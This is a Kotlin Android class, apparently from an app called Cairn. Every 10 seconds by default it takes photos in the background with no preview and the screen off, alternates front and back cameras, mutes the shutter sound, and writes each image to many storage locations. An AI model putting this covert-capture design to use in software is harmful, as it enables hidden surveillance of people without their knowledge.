package com.cairn.app.service

import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import com.cairn.app.storage.StorageLocations
import kotlinx.coroutines.*
import java.io.File
import java.io.FileOutputStream
import kotlin.coroutines.resume

/**
 * 后台静默拍照管线。
 *
 * 核心设计：
 * - Camera2 API，无预览（不亮屏）
 * - 前后摄交替
 * - 默认每 10 秒 1 张，可调 5~60 秒
 * - 写入全部启用位置（同样 10/100 处副本）
 * - ShutterSilencer 关快门音
 */
class PhotoPipeline(
    private val context: Context,
    private val activeLocations: List<StorageLocations.LocationSpec>,
    private val sessionId: String,
    private val intervalSeconds: Int = 10,
    private val jpegQuality: Int = DEFAULT_JPEG_QUALITY
) {
    companion object {
        private const val TAG = "PhotoPipeline"
        const val DEFAULT_JPEG_QUALITY = 70
        private const val TARGET_WIDTH = 1920
        private const val TARGET_HEIGHT = 1080
    }

    private val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
    private val shutterSilencer = ShutterSilencer(context)

    private var backgroundThread: HandlerThread? = null
    private var backgroundHandler: Handler? = null
    private var photoJob: Job? = null
    private var photoIndex = 0
    private var isRunning = false

    // 前后摄交替
    private var useBackCamera = true

    fun start() {
        if (isRunning) return
        isRunning = true

        backgroundThread = HandlerThread("PhotoPipeline").apply { start() }
        backgroundHandler = Handler(backgroundThread!!.looper)

        photoJob = CoroutineScope(Dispatchers.IO).launch {
            while (isActive) {
                delay(intervalSeconds * 1000L)
                if (isActive) {
                    takeSilentPhoto()
                    useBackCamera = !useBackCamera
                }
            }
        }

        Log.i(TAG, "Photo pipeline started, interval=${intervalSeconds}s")
    }

    fun stop() {
        if (!isRunning) return
        isRunning = false

        photoJob?.cancel()
        photoJob = null

        backgroundThread?.quitSafely()
        backgroundThread = null
        backgroundHandler = null

        Log.i(TAG, "Photo pipeline stopped")
    }

    @Suppress("MissingPermission")
    private suspend fun takeSilentPhoto() = withContext(Dispatchers.IO) {
        try {
            val cameraId = pickCameraId() ?: return@withContext

            // 1. 静音
            shutterSilencer.muteBeforeCapture()

            // 2. 配置 ImageReader 捕获 JPEG
            val imageReader = ImageReader.newInstance(
                TARGET_WIDTH, TARGET_HEIGHT, ImageFormat.JPEG, 2
            )

            val completed = CompletableDeferred<ByteArray?>()

            imageReader.setOnImageAvailableListener({ reader ->
                try {
                    val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    image.close()
                    completed.complete(bytes)
                } catch (e: Exception) {
                    completed.complete(null)
                }
            }, backgroundHandler)

            // 3. 打开相机
            val cameraDevice = openCamera(cameraId)
            if (cameraDevice == null) {
                shutterSilencer.restoreAfterCapture()
                return@withContext
            }

            // 4. 创建捕获 session
            val session = createCaptureSession(cameraDevice, imageReader)
            if (session == null) {
                cameraDevice.close()
                shutterSilencer.restoreAfterCapture()
                return@withContext
            }

            // 5. 发起捕获请求（用 ZERO_SHUTTER_LAG 模板减少快门触发）
            val captureBuilder = cameraDevice.createCaptureRequest(
                CameraDevice.TEMPLATE_ZERO_SHUTTER_LAG
            ).apply {
                addTarget(imageReader.surface)
                set(CaptureRequest.JPEG_QUALITY, jpegQuality.coerceIn(10, 100).toByte())
                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
            }

            session.capture(captureBuilder.build(), null, backgroundHandler)

            // 6. 等待 JPEG 数据（最多 3 秒）
            val jpegBytes = withTimeoutOrNull(3000) { completed.await() }

            // 7. 关闭相机
            session.close()
            cameraDevice.close()
            imageReader.close()

            // 8. 写入所有位置
            if (jpegBytes != null) {
                writePhotoToAllLocations(jpegBytes)
                photoIndex++
            }

            // 9. 延迟恢复音量（确保快门音窗口已过）
            delay(500)
            shutterSilencer.restoreAfterCapture()

        } catch (e: Exception) {
            Log.e(TAG, "Take photo failed", e)
            shutterSilencer.restoreAfterCapture()
        }
    }

    @Suppress("MissingPermission")
    private suspend fun openCamera(cameraId: String): CameraDevice? = suspendCancellableCoroutine { cont ->
        try {
            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    if (cont.isActive) cont.resume(camera) { _, _, _ -> }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    if (cont.isActive) cont.resume(null) { _, _, _ -> }
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    if (cont.isActive) cont.resume(null) { _, _, _ -> }
                }
            }, backgroundHandler)
        } catch (e: Exception) {
            if (cont.isActive) cont.resume(null) { _, _, _ -> }
        }
    }

    @Suppress("DEPRECATION")
    private suspend fun createCaptureSession(
        cameraDevice: CameraDevice,
        imageReader: ImageReader
    ): CameraCaptureSession? = suspendCancellableCoroutine { cont ->
        try {
            cameraDevice.createCaptureSession(
                listOf(imageReader.surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        if (cont.isActive) cont.resume(session) { _, _, _ -> }
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        if (cont.isActive) cont.resume(null) { _, _, _ -> }
                    }
                },
                backgroundHandler
            )
        } catch (e: Exception) {
            if (cont.isActive) cont.resume(null) { _, _, _ -> }
        }
    }

    private fun pickCameraId(): String? {
        return try {
            val ids = cameraManager.cameraIdList
            val target = if (useBackCamera) {
                CameraCharacteristics.LENS_FACING_BACK
            } else {
                CameraCharacteristics.LENS_FACING_FRONT
            }

            ids.firstOrNull { id ->
                val chars = cameraManager.getCameraCharacteristics(id)
                chars.get(CameraCharacteristics.LENS_FACING) == target
            } ?: ids.firstOrNull()
        } catch (e: Exception) {
            Log.e(TAG, "pickCameraId failed", e)
            null
        }
    }

    private fun writePhotoToAllLocations(jpegBytes: ByteArray) {
        var written = 0
        for (spec in activeLocations) {
            try {
                val dir = StorageLocations.ensureDirectory(spec)
                val fileName = StorageLocations.generatePhotoFileName(spec, sessionId, photoIndex)
                val file = File(dir, fileName)
                FileOutputStream(file).use { fos ->
                    fos.write(jpegBytes)
                    fos.flush()
                    fos.fd.sync()
                }
                written++
            } catch (e: Exception) {
                Log.w(TAG, "Write photo to ${spec.dirPath} failed: ${e.message}")
            }
        }
        Log.d(TAG, "Photo #$photoIndex written to $written / ${activeLocations.size} locations")
    }
}
